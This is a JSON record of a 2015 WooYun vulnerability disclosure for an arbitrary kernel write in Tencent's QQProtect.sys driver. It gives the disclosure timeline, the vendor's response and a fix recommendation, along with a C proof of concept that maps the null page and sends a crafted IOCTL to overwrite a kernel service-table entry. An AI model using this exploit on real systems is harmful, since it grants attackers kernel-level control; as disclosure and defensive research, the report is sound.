{"id": 35410, "wybug_id": "wooyun-2015-0104000", "wybug_title": "QQ7.0驱动一处内核任意地址写提权漏洞", "wybug_corp": "腾讯", "wybug_author": "路人甲", "wybug_date": "2015-03-30 10:19", "wybug_open_date": "2015-06-28 11:14", "wybug_type": "权限提升", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["驱动权限提升"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向公众公开  简要描述： QQProtect.sys在对IoControlCode=22246c时，逻辑处理不严谨，可引起对内核任意地址写入数据，控制后可实现内核提权。 详细说明：  QQProtect.sys版本：2.10.7.3IoControlCode=22246c时，未对outputBuffer的地址有效性进行验证，可导致任意内核地址被写入0，只要事先在0地址分配可执行内存，写入任意代码，均能在内核态执行。问题原因所在：\n\n   漏洞证明：  \nvoid Fuzz2(HANDLE hDev){\ttypedef LONG (WINAPI*  NtAllocateVirtualMemory)(\t\tHANDLE ProcessHandle,\t\tPVOID *BaseAddress,\t\tULONG_PTR ZeroBits,\t\tPSIZE_T RegionSize,\t\tULONG AllocationType,\t\tULONG Protect);\tNtAllocateVirtualMemory fnAllocate = \t\t(NtAllocateVirtualMemory)GetProcAddress(GetModuleHandle(_T(\"ntdll\")), \"NtAllocateVirtualMemory\");\tif(fnAllocate)\t{\t\tPBYTE pBase = (PBYTE)0x7;\t\tSIZE_T len = 0x1000;\t\tLONG lSucceed = fnAllocate(GetCurrentProcess(), (PVOID*)&pBase, 0, &len, 0x3000, PAGE_EXECUTE_READWRITE);\t}\tmemcpy(0, \"\\xcc\\xcc\", 2);\tDWORD dwReturned = 0;\tchar input[0x1000] = { 0 };\tchar output[4] = { 0 };\tDWORD d = 0x2238f5c9;\tmemcpy(input+4, &d, 4);\td = 0x0e;\tmemcpy(input+8, &d, 4);\tDeviceIoControl(hDev,\t\t0x22246c,\t\t(LPVOID)input,\t\t100,\t\t(LPVOID)0x80502ce4,// nt!KiServiceTable+0x64\t\t0,\t\t&dwReturned,\t\tNULL);}void Fuzz1(){\tLPCTSTR DevName = _T(\"\\\\.\\QQProtect\");\tHANDLE hDev = CreateFile(DevName,\t\tGENERIC_READ|GENERIC_WRITE,\t\tFILE_SHARE_READ|FILE_SHARE_WRITE,\t\tNULL,\t\tOPEN_EXISTING,\t\tFILE_ATTRIBUTE_NORMAL,\t\tNULL);\tif( (HANDLE)-1 != hDev)\t{\t\tFuzz2(hDev);\t\tCloseHandle(hDev);\t}}\n漏洞利用后：\n\n\n\n   修复方案：  对用户传入的输入输出参数进行地址有效性验证。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-03-30 11:13 厂商回复： 已在乌云上报过，但鉴于现在处于漏洞修复期，因此给低1，后续也请乌云官方加强审核，避免重复提交漏洞，谢谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}